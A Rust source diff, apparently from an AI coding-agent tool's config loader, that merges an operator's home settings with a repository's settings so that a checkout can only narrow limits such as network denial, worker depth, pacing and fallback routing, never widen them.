+        let home_pace_enabled = bool_at(take_nested(&mut merged, "pace", "enabled"));
+        let home_pace_max_percent = float_at(take_nested(&mut merged, "pace", "max_percent"));
+        let home_pace_soft_percent = float_at(take_nested(&mut merged, "pace", "soft_percent"));
+        // Issue #155, Phase 3: `context.dedupe_native` gets the identical
+        // lift-before-merge treatment as `pace.enabled` right above, folded
+        // by `narrow_dedupe_bool` instead of `narrow_pace_bool` -- see that
+        // function's own doc comment for why the polarity is inverted.
+        let home_context_dedupe_native =
+            bool_at(take_nested(&mut merged, "context", "dedupe_native"));
+        // Issue #309: `verify_on_stop.enabled`/`max_nudges` get the identical
+        // lift-before-merge treatment -- see `narrow_verify_on_stop_enabled`/
+        // `narrow_max_nudges` below for each field's strict direction.
+        let home_verify_on_stop_enabled =
+            bool_at(take_nested(&mut merged, "verify_on_stop", "enabled"));
+        let home_verify_on_stop_max_nudges =
+            integer_at(take_nested(&mut merged, "verify_on_stop", "max_nudges"));
+        // Issue #308 stage 1: `diagnostics.enabled`/`max_diagnostics`/
+        // `timeout_secs` get the identical lift-before-merge treatment -- see
+        // `narrow_diagnostics_enabled`/`narrow_max_diagnostics`/
+        // `narrow_diagnostics_timeout_secs` below for each field's strict
+        // direction.
+        let home_diagnostics_enabled = bool_at(take_nested(&mut merged, "diagnostics", "enabled"));
+        let home_diagnostics_max =
+            integer_at(take_nested(&mut merged, "diagnostics", "max_diagnostics"));
+        let home_diagnostics_timeout =
+            integer_at(take_nested(&mut merged, "diagnostics", "timeout_secs"));
+        // Issue #312: both `compact_advisory` keys are narrow-only in the
+        // "less eager" direction -- see `narrow_compact_advisory_min_reclaim`.
+        let home_compact_advisory_min_reclaim = integer_at(take_nested(
+            &mut merged,
+            "compact_advisory",
+            "min_reclaim_tokens",
+        ));
+        let home_compact_advisory_window_fraction = float_at(take_nested(
+            &mut merged,
+            "compact_advisory",
+            "window_fraction",
+        ));
+        // Issue #262: `worker.max_depth`/`worker.deny_network` get the
+        // identical lift-before-merge treatment -- see `narrow_worker_
+        // max_depth`/`narrow_worker_deny_network` below for each field's
+        // strict direction. `worker.claude`/`worker.codex`/`worker.
+        // default_depth`/`worker.default_read_only` are NOT lifted here:
+        // they are `REPO_FORBIDDEN` outright, so `reject_untrusted_keys`
+        // (below) catches a repo file naming them before a repo layer could
+        // ever reach this merge.
+        let home_worker_max_depth = integer_at(take_nested(&mut merged, "worker", "max_depth"));
+        let home_worker_deny_network = bool_at(take_nested(&mut merged, "worker", "deny_network"));
+        // Issue #314: `objective.gates`/`max_cycles_without_progress`/`judge`
+        // get the identical lift-before-merge treatment -- see
+        // `narrow_objective_gates`/`narrow_max_cycles_without_progress`/
+        // `narrow_objective_judge` below for each field's strict direction.
+        let home_objective_gates = string_array_at(take_nested(&mut merged, "objective", "gates"));
+        let home_objective_max_cycles = integer_at(take_nested(
+            &mut merged,
+            "objective",
+            "max_cycles_without_progress",
+        ));
+        let home_objective_judge = bool_at(take_nested(&mut merged, "objective", "judge"));
+        // Issue #272: every `[screen]` key gets the identical lift-before-
+        // merge treatment -- see `narrow_screen_threshold`/`narrow_screen_
+        // dominance_pct` below for the shared "lower is stricter" direction.
+        let home_screen_min_fragment = integer_at(take_nested(
+            &mut merged,
+            "screen",
+            "repetition_min_fragment",
+        ));
+        let home_screen_window =
+            integer_at(take_nested(&mut merged, "screen", "repetition_window"));
+        let home_screen_min_repeats =
+            integer_at(take_nested(&mut merged, "screen", "repetition_min_repeats"));
+        let home_screen_dominance_pct = float_at(take_nested(
+            &mut merged,
+            "screen",
+            "repetition_dominance_pct",
+        ));
+        let home_obfuscate_email_domain = take_nested(&mut merged, "obfuscate", "email_domain");
+        let home_obfuscate_patterns = take_nested(&mut merged, "obfuscate", "patterns");
+        // `supervise.heavy_command_patterns` gets the identical treatment as
+        // `sandbox.extra_deny` above, for the identical reason: the field's
+        // own doc comment promises a repo layer may only ADD patterns, never
+        // replace the operator's own list, but the ordinary `merge()` below
+        // would let a repo `heavy_command_patterns = []` (or any other
+        // array) silently clobber the home layer's entries instead of
+        // adding to them. Lifted out and unioned once both layers are in
+        // hand, same as `extra_deny`.
+        let home_heavy_patterns = string_array(take_nested(
+            &mut merged,
+            "supervise",
+            "heavy_command_patterns",
+        ));
+        // Issue #358 T8: `supervise.orchestrator_writes` gets the identical
+        // lift-before-merge treatment as `pace.enabled` above -- see
+        // `narrow_orchestrator_writes` for the strict direction.
+        let home_orchestrator_writes = orchestrator_writes_at(
+            take_nested(&mut merged, "supervise", "orchestrator_writes"),
+            "supervise.orchestrator_writes",
+        )?;
+        // Issue #311: `supervise.loop_backoff_ceiling_secs` gets the
+        // identical lift-before-merge treatment -- see `narrow_loop_backoff_
+        // ceiling_secs` below for the strict direction.
+        let home_loop_backoff_ceiling = integer_at(take_nested(
+            &mut merged,
+            "supervise",
+            "loop_backoff_ceiling_secs",
+        ));
+        // Issue #412: `output.diff_max_bytes` gets the identical lift-before-
+        // merge treatment -- see `narrow_diff_max_bytes` below for the strict
+        // direction.
+        let home_output_diff_max_bytes =
+            integer_at(take_nested(&mut merged, "output", "diff_max_bytes"));
+
+        // Issue #186: every fallback field is lifted before the repo merge.
+        // The repo may only narrow automatic vendor steering; see the
+        // re-insertion below for each field's strict direction.
+        let home_fallback_enabled = bool_at(take_nested(&mut merged, "fallback", "enabled"));
+        // Issue #455: `fallback.health.enabled` gets the identical AND fold
+        // as `fallback.enabled` right above -- a repo may switch the
+        // route-health breaker off, never on for an operator who disabled
+        // it. Its three timing knobs need no lift: they are `REPO_FORBIDDEN`
+        // outright, so `reject_untrusted_keys` has already refused the whole
+        // load if a repo layer named one.
+        let home_fallback_health_enabled =
+            bool_at(take_nested3(&mut merged, "fallback", "health", "enabled"));
+        let home_fallback_order = string_array_at(take_nested(&mut merged, "fallback", "order"));
+        let home_fallback_predictive = float_at(take_nested(
+            &mut merged,
+            "fallback",
+            "predictive_headroom_pct",
+        ));
+        let home_fallback_min_candidate = float_at(take_nested(
+            &mut merged,
+            "fallback",
+            "min_candidate_headroom_pct",
+        ));
+        let home_fallback_unknown =
+            float_at(take_nested(&mut merged, "fallback", "unknown_headroom_pct"));
+        let home_fallback_small_tokens = integer_at(take_nested(
+            &mut merged,
+            "fallback",
+            "small_task_max_tokens",
+        ));
+        let home_fallback_small_tools = integer_at(take_nested(
+            &mut merged,
+            "fallback",
+            "small_task_max_tool_calls",
+        ));
+        let home_fallback_adaptive =
+            bool_at(take_nested(&mut merged, "fallback", "adaptive_delegation"));
+        let home_fallback_auto_rollover = bool_at(take_nested(
+            &mut merged,
+            "fallback",
+            "auto_orchestrator_rollover",
+        ));
+        let home_fallback_harness =
+            fallback_harness_map_at(take_nested(&mut merged, "fallback", "harness"));
+        let home_deploy_tier = deploy_tier_at(
+            take_nested3(&mut merged, "workflow", "deploy", "tier"),
+            "workflow.deploy.tier",
+        )?;
+        let home_deploy_minimum = deploy_tier_at(
+            take_nested3(&mut merged, "workflow", "deploy", "minimum_tier"),
+            "workflow.deploy.minimum_tier",
+        )?;
+
+        // Read on its own first: the repo layer is the one layer that comes
+        // from a checkout rather than from the operator. If `repo` IS the
+        // operator's own home directory (`zirv`/`zirv chat` run from `~`),
+        // there is no repository layer at all -- without this check,
+        // `~/.zirv/ctx.toml` would be read a second time as the repo layer
+        // and hard-error on `agent`, a key only the operator layer may set.
+        let repo_path = repo
+            .join(crate::utils::SCRIPT_DIR_NAME)
+            .join(CTX_CONFIG_FILE);
+        let mut repo_layer = toml::Table::new();
+        if !crate::utils::repo_is_home(repo)
+            && let Some(bad) = read_layer(&repo_path, &mut repo_layer, false)?
+        {
+            unparsable_layers.push(bad);
+        }
+        // Before the lift, so a future `policy.*` entry in `REPO_FORBIDDEN`
+        // still gets its loud rejection rather than being quietly folded.
+        // Trivially satisfied when the repo layer above failed to parse:
+        // `repo_layer` is empty in that case, so there is nothing here for it
+        // to reject -- an unparsable repo file can name no forbidden key,
+        // parsed or not.
+        reject_untrusted_keys(&repo_layer, &repo_path)?;
+        let repo_policy = repo_layer.remove(POLICY_SECTION);
+        // Removed only after the rejection check above has already run, so a
+        // repo file naming `safety.allow`/`safety.default` (both
+        // `REPO_FORBIDDEN`) is still caught loudly here rather than being
+        // silently dropped by this lift -- see `super::safety::resolve`'s
+        // own doc comment for the defense-in-depth half of this guarantee.
+        let repo_safety = repo_layer.remove(SAFETY_SECTION);
+        let repo_extra_deny = string_array(take_nested(&mut repo_layer, "sandbox", "extra_deny"));
+        let repo_pace_enabled = bool_at(take_nested(&mut repo_layer, "pace", "enabled"));
+        let repo_pace_max_percent = float_at(take_nested(&mut repo_layer, "pace", "max_percent"));
+        let repo_pace_soft_percent = float_at(take_nested(&mut repo_layer, "pace", "soft_percent"));
+        let repo_context_dedupe_native =
+            bool_at(take_nested(&mut repo_layer, "context", "dedupe_native"));
+        let repo_verify_on_stop_enabled =
+            bool_at(take_nested(&mut repo_layer, "verify_on_stop", "enabled"));
+        let repo_verify_on_stop_max_nudges =
+            integer_at(take_nested(&mut repo_layer, "verify_on_stop", "max_nudges"));
+        let repo_diagnostics_enabled =
+            bool_at(take_nested(&mut repo_layer, "diagnostics", "enabled"));
+        let repo_diagnostics_max = integer_at(take_nested(
+            &mut repo_layer,
+            "diagnostics",
+            "max_diagnostics",
+        ));
+        let repo_diagnostics_timeout =
+            integer_at(take_nested(&mut repo_layer, "diagnostics", "timeout_secs"));
+        let repo_compact_advisory_min_reclaim = integer_at(take_nested(
+            &mut repo_layer,
+            "compact_advisory",
+            "min_reclaim_tokens",
+        ));
+        let repo_compact_advisory_window_fraction = float_at(take_nested(
+            &mut repo_layer,
+            "compact_advisory",
+            "window_fraction",
+        ));
+        let repo_worker_max_depth = integer_at(take_nested(&mut repo_layer, "worker", "max_depth"));
+        let repo_worker_deny_network =
+            bool_at(take_nested(&mut repo_layer, "worker", "deny_network"));
+        let repo_objective_gates =
+            string_array_at(take_nested(&mut repo_layer, "objective", "gates"));
+        let repo_objective_max_cycles = integer_at(take_nested(
+            &mut repo_layer,
+            "objective",
+            "max_cycles_without_progress",
+        ));
+        let repo_objective_judge = bool_at(take_nested(&mut repo_layer, "objective", "judge"));
+        let repo_screen_min_fragment = integer_at(take_nested(
+            &mut repo_layer,
+            "screen",
+            "repetition_min_fragment",
+        ));
+        let repo_screen_window =
+            integer_at(take_nested(&mut repo_layer, "screen", "repetition_window"));
+        let repo_screen_min_repeats = integer_at(take_nested(
+            &mut repo_layer,
+            "screen",
+            "repetition_min_repeats",
+        ));
+        let repo_screen_dominance_pct = float_at(take_nested(
+            &mut repo_layer,
+            "screen",
+            "repetition_dominance_pct",
+        ));
+        let repo_obfuscate_email_domain = take_nested(&mut repo_layer, "obfuscate", "email_domain");
+        let repo_obfuscate_patterns = take_nested(&mut repo_layer, "obfuscate", "patterns");
+        let repo_heavy_patterns = string_array(take_nested(
+            &mut repo_layer,
+            "supervise",
+            "heavy_command_patterns",
+        ));
+        let repo_orchestrator_writes = orchestrator_writes_at(
+            take_nested(&mut repo_layer, "supervise", "orchestrator_writes"),
+            "supervise.orchestrator_writes",
+        )?;
+        let repo_loop_backoff_ceiling = integer_at(take_nested(
+            &mut repo_layer,
+            "supervise",
+            "loop_backoff_ceiling_secs",
+        ));
+        let repo_output_diff_max_bytes =
+            integer_at(take_nested(&mut repo_layer, "output", "diff_max_bytes"));
+        let repo_fallback_enabled = bool_at(take_nested(&mut repo_layer, "fallback", "enabled"));
+        let repo_fallback_health_enabled = bool_at(take_nested3(
+            &mut repo_layer,
+            "fallback",
+            "health",
+            "enabled",
+        ));
+        let repo_fallback_order =
+            string_array_at(take_nested(&mut repo_layer, "fallback", "order"));
+        let repo_fallback_predictive = float_at(take_nested(
+            &mut repo_layer,
+            "fallback",
+            "predictive_headroom_pct",
+        ));
+        let repo_fallback_min_candidate = float_at(take_nested(
+            &mut repo_layer,
+            "fallback",
+            "min_candidate_headroom_pct",
+        ));
+        let repo_fallback_unknown = float_at(take_nested(
+            &mut repo_layer,
+            "fallback",
+            "unknown_headroom_pct",
+        ));
+        let repo_fallback_small_tokens = integer_at(take_nested(
+            &mut repo_layer,
+            "fallback",
+            "small_task_max_tokens",
+        ));
+        let repo_fallback_small_tools = integer_at(take_nested(
+            &mut repo_layer,
+            "fallback",
+            "small_task_max_tool_calls",
+        ));
+        let repo_fallback_adaptive = bool_at(take_nested(
+            &mut repo_layer,
+            "fallback",
+            "adaptive_delegation",
+        ));
+        let repo_fallback_auto_rollover = bool_at(take_nested(
+            &mut repo_layer,
+            "fallback",
+            "auto_orchestrator_rollover",
+        ));
+        let repo_fallback_harness =
+            fallback_harness_map_at(take_nested(&mut repo_layer, "fallback", "harness"));
+        let repo_deploy_minimum = deploy_tier_at(
+            take_nested3(&mut repo_layer, "workflow", "deploy", "minimum_tier"),
+            "workflow.deploy.minimum_tier",
+        )?;
+        merge(&mut merged, repo_layer);
+
+        // A repo may only tighten email handling to `mask`. `keep` never
+        // overrides an operator's `mask`. Pattern tables are additive so a
+        // checkout cannot discard an operator detector by replacing its
+        // array during the ordinary deep merge.
+        let home_masks_email = matches!(
+            home_obfuscate_email_domain.as_ref(),
+            Some(toml::Value::String(value)) if value == "mask"
+        );
+        let repo_masks_email = matches!(
+            repo_obfuscate_email_domain.as_ref(),
+            Some(toml::Value::String(value)) if value == "mask"
+        );
+        insert_path(
+            &mut merged,
+            &["obfuscate", "email_domain"],
+            toml::Value::String(if home_masks_email || repo_masks_email {
+                "mask".to_string()
+            } else {
+                "keep".to_string()
+            }),
+        );
+        let mut patterns = match home_obfuscate_patterns {
+            Some(toml::Value::Array(values)) => values,
+            _ => Vec::new(),
+        };
+        if let Some(toml::Value::Array(values)) = repo_obfuscate_patterns {
+            patterns.extend(values);
+        }
+        if !patterns.is_empty() {
+            insert_path(
+                &mut merged,
+                &["obfuscate", "patterns"],
+                toml::Value::Array(patterns),
+            );
+        }
+
+        let default_deploy = WorkflowDeployConfig::default();
+        let declared_minimum = home_deploy_minimum.max(repo_deploy_minimum);
+        let effective_deploy = home_deploy_tier
+            .unwrap_or(default_deploy.tier)
+            .max(declared_minimum.unwrap_or(default_deploy.tier));
+        insert_path(
+            &mut merged,
+            &["workflow", "deploy", "tier"],
+            toml::Value::String(effective_deploy.to_string()),
+        );
+        if let Some(minimum) = declared_minimum {
+            insert_path(
+                &mut merged,
+                &["workflow", "deploy", "minimum_tier"],
+                toml::Value::String(minimum.to_string()),
+            );
+        }
+
+        // Issue #358 T8: `supervise.orchestrator_writes` gets the identical
+        // re-insertion as `pace.enabled` right below -- narrowed by `narrow_
+        // orchestrator_writes`, then still overwritable by `ZIRV_CTX_
+        // SUPERVISE_ORCHESTRATOR_WRITES` (`ENV_MAP`, below) the same as
+        // every other narrow-only key.
+        let default_supervise = SuperviseConfig::default();
+        insert_path(
+            &mut merged,
+            &["supervise", "orchestrator_writes"],
+            toml::Value::String(
+                narrow_orchestrator_writes(
+                    home_orchestrator_writes.unwrap_or(default_supervise.orchestrator_writes),
+                    repo_orchestrator_writes,
+                )
+                .label()
+                .to_string(),
+            ),
+        );
+        // Issue #311: `supervise.loop_backoff_ceiling_secs` gets the
+        // identical re-insertion, narrowed by `narrow_loop_backoff_ceiling_
+        // secs`, then still overwritable by `ZIRV_CTX_SUPERVISE_LOOP_
+        // BACKOFF_CEILING_SECS` (`ENV_MAP`, below) the same as every other
+        // narrow-only key.
+        insert_path(
+            &mut merged,
+            &["supervise", "loop_backoff_ceiling_secs"],
+            toml::Value::Integer(
+                i64::try_from(narrow_loop_backoff_ceiling_secs(
+                    home_loop_backoff_ceiling
+                        .and_then(|v| u64::try_from(v).ok())
+                        .unwrap_or(default_supervise.loop_backoff_ceiling_secs),
+                    repo_loop_backoff_ceiling.and_then(|v| u64::try_from(v).ok()),
+                ))
+                .unwrap_or(i64::MAX),
+            ),
+        );
+        // Issue #412: `output.diff_max_bytes` gets the identical
+        // re-insertion, narrowed by `narrow_diff_max_bytes`, then still
+        // overwritable by `ZIRV_CTX_OUTPUT_DIFF_MAX_BYTES` (`ENV_MAP`, below)
+        // the same as every other narrow-only key.
+        let default_output = OutputConfig::default();
+        insert_path(
+            &mut merged,
+            &["output", "diff_max_bytes"],
+            toml::Value::Integer(
+                i64::try_from(narrow_diff_max_bytes(
+                    home_output_diff_max_bytes
+                        .and_then(|v| u64::try_from(v).ok())
+                        .unwrap_or(default_output.diff_max_bytes as u64),
+                    repo_output_diff_max_bytes.and_then(|v| u64::try_from(v).ok()),
+                ))
+                .unwrap_or(i64::MAX),
+            ),
+        );
+
+        // Re-inserted after the merge, before env: env (below) must still be
+        // able to overwrite this outright, the same final-word precedence
+        // every other key already gets.
+        let default_pace = PaceConfig::default();
+        insert_path(
+            &mut merged,
+            &["pace", "enabled"],
+            toml::Value::Boolean(narrow_pace_bool(
+                home_pace_enabled.unwrap_or(default_pace.enabled),
+                repo_pace_enabled,
+            )),
+        );
+        insert_path(
+            &mut merged,
+            &["pace", "max_percent"],
+            toml::Value::Float(narrow_pace_percent(
+                home_pace_max_percent.unwrap_or(default_pace.max_percent),
+                repo_pace_max_percent,
+            )),
+        );
+        insert_path(
+            &mut merged,
+            &["pace", "soft_percent"],
+            toml::Value::Float(narrow_pace_percent(
+                home_pace_soft_percent.unwrap_or(default_pace.soft_percent),
+                repo_pace_soft_percent,
+            )),
+        );
+        let default_context = ContextConfig::default();
+        insert_path(
+            &mut merged,
+            &["context", "dedupe_native"],
+            toml::Value::Boolean(narrow_dedupe_bool(
+                home_context_dedupe_native.unwrap_or(default_context.dedupe_native),
+                repo_context_dedupe_native,
+            )),
+        );
+        let default_verify_on_stop = VerifyOnStopConfig::default();
+        insert_path(
+            &mut merged,
+            &["verify_on_stop", "enabled"],
+            toml::Value::Boolean(narrow_verify_on_stop_enabled(
+                home_verify_on_stop_enabled.unwrap_or(default_verify_on_stop.enabled),
+                repo_verify_on_stop_enabled,
+            )),
+        );
+        let home_max_nudges = home_verify_on_stop_max_nudges
+            .and_then(|v| u32::try_from(v).ok())
+            .unwrap_or(default_verify_on_stop.max_nudges);
+        let repo_max_nudges = repo_verify_on_stop_max_nudges.and_then(|v| u32::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["verify_on_stop", "max_nudges"],
+            toml::Value::Integer(i64::from(narrow_max_nudges(
+                home_max_nudges,
+                repo_max_nudges,
+            ))),
+        );
+
+        let default_diagnostics = DiagnosticsConfig::default();
+        insert_path(
+            &mut merged,
+            &["diagnostics", "enabled"],
+            toml::Value::Boolean(narrow_diagnostics_enabled(
+                home_diagnostics_enabled.unwrap_or(default_diagnostics.enabled),
+                repo_diagnostics_enabled,
+            )),
+        );
+        let home_max_diagnostics = home_diagnostics_max
+            .and_then(|v| u32::try_from(v).ok())
+            .unwrap_or(default_diagnostics.max_diagnostics);
+        let repo_max_diagnostics = repo_diagnostics_max.and_then(|v| u32::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["diagnostics", "max_diagnostics"],
+            toml::Value::Integer(i64::from(narrow_max_diagnostics(
+                home_max_diagnostics,
+                repo_max_diagnostics,
+            ))),
+        );
+        let home_diagnostics_timeout_secs = home_diagnostics_timeout
+            .and_then(|v| u64::try_from(v).ok())
+            .unwrap_or(default_diagnostics.timeout_secs);
+        let repo_diagnostics_timeout_secs =
+            repo_diagnostics_timeout.and_then(|v| u64::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["diagnostics", "timeout_secs"],
+            toml::Value::Integer(
+                i64::try_from(narrow_diagnostics_timeout_secs(
+                    home_diagnostics_timeout_secs,
+                    repo_diagnostics_timeout_secs,
+                ))
+                .unwrap_or(i64::MAX),
+            ),
+        );
+
+        let default_compact_advisory = CompactAdvisoryConfig::default();
+        let home_compact_advisory_min_reclaim_tokens = home_compact_advisory_min_reclaim
+            .and_then(|v| u64::try_from(v).ok())
+            .unwrap_or(default_compact_advisory.min_reclaim_tokens);
+        insert_path(
+            &mut merged,
+            &["compact_advisory", "min_reclaim_tokens"],
+            toml::Value::Integer(
+                i64::try_from(narrow_compact_advisory_min_reclaim(
+                    home_compact_advisory_min_reclaim_tokens,
+                    repo_compact_advisory_min_reclaim.and_then(|v| u64::try_from(v).ok()),
+                ))
+                .unwrap_or(i64::MAX),
+            ),
+        );
+        insert_path(
+            &mut merged,
+            &["compact_advisory", "window_fraction"],
+            toml::Value::Float(narrow_compact_advisory_window_fraction(
+                home_compact_advisory_window_fraction
+                    .unwrap_or(default_compact_advisory.window_fraction),
+                repo_compact_advisory_window_fraction,
+            )),
+        );
+
+        let default_worker = WorkerConfig::default();
+        let home_worker_max_depth_value = home_worker_max_depth
+            .and_then(|v| u8::try_from(v).ok())
+            .unwrap_or(default_worker.max_depth);
+        let repo_worker_max_depth_value = repo_worker_max_depth.and_then(|v| u8::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["worker", "max_depth"],
+            toml::Value::Integer(i64::from(narrow_worker_max_depth(
+                home_worker_max_depth_value,
+                repo_worker_max_depth_value,
+            ))),
+        );
+        insert_path(
+            &mut merged,
+            &["worker", "deny_network"],
+            toml::Value::Boolean(narrow_worker_deny_network(
+                home_worker_deny_network.unwrap_or(default_worker.deny_network),
+                repo_worker_deny_network,
+            )),
+        );
+
+        let default_objective = ObjectiveConfig::default();
+        let home_objective_gates_value =
+            home_objective_gates.unwrap_or_else(|| default_objective.gates.clone());
+        insert_path(
+            &mut merged,
+            &["objective", "gates"],
+            toml::Value::Array(
+                narrow_objective_gates(home_objective_gates_value, repo_objective_gates)
+                    .into_iter()
+                    .map(toml::Value::String)
+                    .collect(),
+            ),
+        );
+        let home_objective_max_cycles_value = home_objective_max_cycles
+            .and_then(|v| u32::try_from(v).ok())
+            .unwrap_or(default_objective.max_cycles_without_progress);
+        let repo_objective_max_cycles_value =
+            repo_objective_max_cycles.and_then(|v| u32::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["objective", "max_cycles_without_progress"],
+            toml::Value::Integer(i64::from(narrow_max_cycles_without_progress(
+                home_objective_max_cycles_value,
+                repo_objective_max_cycles_value,
+            ))),
+        );
+        insert_path(
+            &mut merged,
+            &["objective", "judge"],
+            toml::Value::Boolean(narrow_objective_judge(
+                home_objective_judge.unwrap_or(default_objective.judge),
+                repo_objective_judge,
+            )),
+        );
+
+        let default_screen = ScreenConfig::default();
+        let home_screen_min_fragment_value = home_screen_min_fragment
+            .and_then(|v| u32::try_from(v).ok())
+            .unwrap_or(default_screen.repetition_min_fragment);
+        let repo_screen_min_fragment_value =
+            repo_screen_min_fragment.and_then(|v| u32::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["screen", "repetition_min_fragment"],
+            toml::Value::Integer(i64::from(narrow_screen_threshold(
+                home_screen_min_fragment_value,
+                repo_screen_min_fragment_value,
+            ))),
+        );
+        let home_screen_window_value = home_screen_window
+            .and_then(|v| u32::try_from(v).ok())
+            .unwrap_or(default_screen.repetition_window);
+        let repo_screen_window_value = repo_screen_window.and_then(|v| u32::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["screen", "repetition_window"],
+            toml::Value::Integer(i64::from(narrow_screen_threshold(
+                home_screen_window_value,
+                repo_screen_window_value,
+            ))),
+        );
+        let home_screen_min_repeats_value = home_screen_min_repeats
+            .and_then(|v| u32::try_from(v).ok())
+            .unwrap_or(default_screen.repetition_min_repeats);
+        let repo_screen_min_repeats_value =
+            repo_screen_min_repeats.and_then(|v| u32::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["screen", "repetition_min_repeats"],
+            toml::Value::Integer(i64::from(narrow_screen_threshold(
+                home_screen_min_repeats_value,
+                repo_screen_min_repeats_value,
+            ))),
+        );
+        insert_path(
+            &mut merged,
+            &["screen", "repetition_dominance_pct"],
+            toml::Value::Float(narrow_screen_dominance_pct(
+                home_screen_dominance_pct.unwrap_or(default_screen.repetition_dominance_pct),
+                repo_screen_dominance_pct,
+            )),
+        );
+
+        let default_fallback = FallbackConfig::default();
+        let home_enabled = home_fallback_enabled.unwrap_or(default_fallback.enabled);
+        insert_path(
+            &mut merged,
+            &["fallback", "enabled"],
+            toml::Value::Boolean(home_enabled && repo_fallback_enabled.unwrap_or(true)),
+        );
+        let home_health_enabled =
+            home_fallback_health_enabled.unwrap_or(default_fallback.health.enabled);
+        insert_path(
+            &mut merged,
+            &["fallback", "health", "enabled"],
+            toml::Value::Boolean(
+                home_health_enabled && repo_fallback_health_enabled.unwrap_or(true),
+            ),
+        );
+        let home_order = home_fallback_order.unwrap_or_else(|| default_fallback.order.clone());
+        insert_path(
+            &mut merged,
+            &["fallback", "order"],
+            toml::Value::Array(
+                narrow_fallback_order(home_order, repo_fallback_order)
+                    .into_iter()
+                    .map(toml::Value::String)
+                    .collect(),
+            ),
+        );
+        insert_path(
+            &mut merged,
+            &["fallback", "predictive_headroom_pct"],
+            toml::Value::Float(
+                home_fallback_predictive
+                    .unwrap_or(default_fallback.predictive_headroom_pct)
+                    .min(repo_fallback_predictive.unwrap_or(f64::INFINITY)),
+            ),
+        );
+        let merged_min_candidate = home_fallback_min_candidate
+            .unwrap_or(default_fallback.min_candidate_headroom_pct)
+            .max(repo_fallback_min_candidate.unwrap_or(f64::NEG_INFINITY));
+        insert_path(
+            &mut merged,
+            &["fallback", "min_candidate_headroom_pct"],
+            toml::Value::Float(merged_min_candidate),
+        );
+        insert_path(
+            &mut merged,
+            &["fallback", "unknown_headroom_pct"],
+            toml::Value::Float(
+                home_fallback_unknown
+                    .unwrap_or(default_fallback.unknown_headroom_pct)
+                    .min(repo_fallback_unknown.unwrap_or(f64::INFINITY)),
+            ),
+        );
+        let home_small_tokens = home_fallback_small_tokens
+            .and_then(|v| u64::try_from(v).ok())
+            .unwrap_or(default_fallback.small_task_max_tokens);
+        let repo_small_tokens = repo_fallback_small_tokens.and_then(|v| u64::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["fallback", "small_task_max_tokens"],
+            toml::Value::Integer(
+                home_small_tokens
+                    .min(repo_small_tokens.unwrap_or(u64::MAX))
+                    .try_into()
+                    .unwrap_or(i64::MAX),
+            ),
+        );
+        let home_small_tools = home_fallback_small_tools
+            .and_then(|v| u32::try_from(v).ok())
+            .unwrap_or(default_fallback.small_task_max_tool_calls);
+        let repo_small_tools = repo_fallback_small_tools.and_then(|v| u32::try_from(v).ok());
+        insert_path(
+            &mut merged,
+            &["fallback", "small_task_max_tool_calls"],
+            toml::Value::Integer(i64::from(
+                home_small_tools.min(repo_small_tools.unwrap_or(u32::MAX)),
+            )),
+        );
+        let home_adaptive = home_fallback_adaptive.unwrap_or(default_fallback.adaptive_delegation);
+        insert_path(
+            &mut merged,
+            &["fallback", "adaptive_delegation"],
+            toml::Value::Boolean(home_adaptive && repo_fallback_adaptive.unwrap_or(true)),
+        );
+        // Left ABSENT when neither layer decided, so the roster default in
+        // `CtxConfig::auto_orchestrator_rollover` applies: writing the
+        // struct default back in would freeze today's answer into the merged
+        // table. A repo `true` on an unset home layer is a widening and is
+        // discarded; a repo `false` narrows and sticks.
+        let merged_auto_rollover = match (home_fallback_auto_rollover, repo_fallback_auto_rollover)
+        {
+            (Some(home), repo) => Some(home && repo.unwrap_or(true)),
+            (None, Some(false)) => Some(false),
+            (None, _) => None,
+        };
+        if let Some(value) = merged_auto_rollover {
+            insert_path(
+                &mut merged,
+                &["fallback", "auto_orchestrator_rollover"],
+                toml::Value::Boolean(value),
+            );
+        }
+        let merged_harness = narrow_fallback_harness(
+            home_fallback_harness,
+            repo_fallback_harness,
+            merged_min_candidate,
+        );
+        insert_path(
+            &mut merged,
+            &["fallback", "harness"],
+            toml::Value::Table(
+                merged_harness
+                    .into_iter()
+                    .map(|(name, (max_active, reserve_headroom_pct))| {
+                        let mut entry = toml::Table::new();
+                        if let Some(max_active) = max_active {
+                            entry
+                                .insert("max_active".to_string(), toml::Value::Integer(max_active));
+                        }
+                        if let Some(reserve_headroom_pct) = reserve_headroom_pct {
+                            entry.insert(
+                                "reserve_headroom_pct".to_string(),
+                                toml::Value::Float(reserve_headroom_pct),
+                            );
+                        }
+                        (name, toml::Value::Table(entry))
+                    })
+                    .collect(),
+            ),
+        );
+
+        for (var, path, kind) in ENV_MAP {
+            if let Some(raw) = env(var) {
+                let value = env_value(&raw, *kind).map_err(|e| format!("{var}: {e}"))?;
+                insert_path(&mut merged, path, value);
+            }
+        }
+
+        // Issue #155, Phase 5(e): `supervise.max_heavy_workers` is a
+        // deprecated alias for `max_heavy_operations`, rewritten here --
+        // after every layer, including the `ENV_MAP` loop just above, has
+        // already contributed -- because `SuperviseConfig` is
+        // `deny_unknown_fields` and an old key surviving to `try_into()`
+        // below would hard-fail the load rather than degrade gracefully.
+        // Positioned after `ENV_MAP` rather than alongside the `pace`/
+        // `context` re-insertions above so the deprecated
+        // `ZIRV_CTX_SUPERVISE_MAX_HEAVY_WORKERS` env var (still in
+        // `ENV_MAP`, unchanged) gets the identical rewrite a deprecated TOML
+        // key gets, instead of leaving its own stray `max_heavy_workers`
+        // entry behind. The new key wins whenever both spellings ended up
+        // set, regardless of which layer or env var supplied either one.
+        if let Some(old) = take_nested(&mut merged, "supervise", "max_heavy_workers")
+            && value_at(&merged, &["supervise", "max_heavy_operations"]).is_none()
+        {
+            insert_path(&mut merged, &["supervise", "max_heavy_operations"], old);
+        }
+
+        let mut cfg: Self = toml::Value::Table(merged)
+            .try_into()
+            .map_err(|e| format!("invalid ctx config: {e}"))?;
+
+        // See `PromptConfig::orchestrator_writes`'s own doc comment: copied
+        // over here, once the full config (both layers, narrowing and env
+        // already resolved) is assembled, rather than threading a new
+        // parameter through every prompt-composition call site.
+        cfg.prompt.orchestrator_writes = cfg.supervise.orchestrator_writes;
+
